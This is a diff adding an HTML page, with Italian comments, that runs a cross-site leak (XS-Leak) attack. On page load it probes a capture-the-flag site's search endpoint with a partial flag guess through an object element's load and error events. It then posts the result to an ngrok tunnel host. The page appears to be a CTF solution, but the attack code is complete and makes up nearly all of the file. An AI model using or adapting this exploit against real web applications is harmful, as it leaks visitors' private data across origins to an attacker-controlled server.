@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XS-Leak Test</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+        }
+        #result {
+            margin-top: 20px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <h1>XS-Leak Test</h1>
+    <div id="result">In attesa di risultati...</div>
+
+    <script>
+        const leak = async (url) => {
+            return new Promise((resolve) => {
+                let s = document.createElement('object');
+                s.data = url;
+                s.onload = (e) => {
+                    e.target.remove();
+                    return resolve(0); // Risorsa accessibile
+                };
+                s.onerror = (e) => {
+                    e.target.remove();
+                    return resolve(1); // Risorsa non accessibile
+                };
+                document.body.appendChild(s);
+            });
+        };
+
+        // Funzione da chiamare al caricamento della pagina
+        const testResourceLeak = async () => {
+            const url = 'https://matrix.capturetheflags.site/search?s=flag{'; // Sostituisci con l'URL da testare
+            const result = await leak(url);
+            const resultDiv = document.getElementById('result');
+
+            let message;
+            if (result === 0) {
+                resultDiv.textContent = 'Risorsa accessibile (status 200)';
+                message = 'Risorsa accessibile';
+            } else {
+                resultDiv.textContent = 'Risorsa non accessibile (status 404 o errore)';
+                message = 'Risorsa non accessibile';
+            }
+
+            // Invia il log al server Flask
+            await logResult(message);
+        };
+
+        // Funzione per inviare i log al server Flask
+        const logResult = async (message) => {
+        const ngrokUrl = 'https://19ec-87-4-142-72.ngrok-free.app/'; // Sostituisci con il tuo URL Ngrok
+        try {
+            const response = await fetch(`${ngrokUrl}/log`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ message }),
+            });
+
+            if (!response.ok) {
+                console.error('Errore durante l\'invio del log:', response.statusText);
+            } else {
+                console.log('Log inviato con successo');
+            }
+        } catch (error) {
+            console.error('Errore di rete:', error);
+        }
+    };
+
+
+
+        // Esegui il test al caricamento del DOM
+        document.addEventListener('DOMContentLoaded', testResourceLeak);
+    </script>
+</body>
+</html>
